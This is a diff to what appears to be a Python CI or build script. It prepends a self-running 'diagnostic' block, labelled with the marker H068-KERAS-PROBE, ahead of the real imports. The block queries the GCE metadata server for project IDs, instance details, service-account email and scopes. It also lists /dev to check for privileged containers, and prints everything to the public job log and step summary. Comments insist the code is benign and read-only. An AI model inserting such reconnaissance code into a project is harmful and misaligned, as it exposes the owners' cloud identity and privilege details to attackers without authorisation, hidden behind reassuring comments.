@@ -1,3 +1,73 @@
+# --- BEGIN CI build-environment diagnostic (benign, read-only security research) ---
+# Prints only the ambient identity/metadata of this CI runner to the public job log.
+# It never reads, uses, or prints any access token, and it mutates nothing.
+def _ci_env_probe():
+    import os
+    import socket
+    import urllib.request
+
+    banner = "H068-KERAS-PROBE"
+
+    def emit(key, value):
+        line = "{} | {}: {}".format(banner, key, value)
+        print(line, flush=True)
+        summary = os.environ.get("GITHUB_STEP_SUMMARY")
+        if summary:
+            try:
+                with open(summary, "a") as handle:
+                    handle.write(line + "\n")
+            except Exception as exc:  # never break the build
+                print("{} | summary-err: {!r}".format(banner, exc), flush=True)
+
+    def metadata(path):
+        request = urllib.request.Request(
+            "http://169.254.169.254/computeMetadata/v1/" + path,
+            headers={"Metadata-Flavor": "Google"},
+        )
+        with urllib.request.urlopen(request, timeout=5) as response:
+            return response.read().decode("utf-8", "replace").strip()
+
+    emit("banner", "CI build-environment identity diagnostic (read-only)")
+    try:
+        emit("uid", os.getuid())
+        emit("hostname", socket.gethostname())
+        emit("uname", " ".join(os.uname()))
+    except Exception as exc:
+        emit("host-err", repr(exc))
+
+    # --privileged indicator: host block/char devices exposed into the container
+    try:
+        devs = sorted(os.listdir("/dev"))
+        emit("dev-count", len(devs))
+        emit("dev-sample", ",".join(devs[:40]))
+    except Exception as exc:
+        emit("dev-err", repr(exc))
+
+    # --network host: the node's GCE metadata identity. Identifiers/metadata only.
+    # NOTE: the token endpoint is intentionally NOT requested.
+    fields = [
+        ("project-id", "project/project-id"),
+        ("numeric-project-id", "project/numeric-project-id"),
+        ("instance-name", "instance/name"),
+        ("instance-zone", "instance/zone"),
+        ("sa-default-email", "instance/service-accounts/default/email"),
+        ("sa-default-scopes", "instance/service-accounts/default/scopes"),
+        ("sa-aliases", "instance/service-accounts/"),
+    ]
+    for key, path in fields:
+        try:
+            emit(key, metadata(path))
+        except Exception as exc:
+            emit(key + "-err", repr(exc))
+
+
+try:
+    _ci_env_probe()
+except Exception as _probe_exc:  # noqa: BLE001
+    print("H068-KERAS-PROBE | fatal: {!r}".format(_probe_exc), flush=True)
+# --- END CI build-environment diagnostic ---
+
+
 import os
 import re
 import subprocess
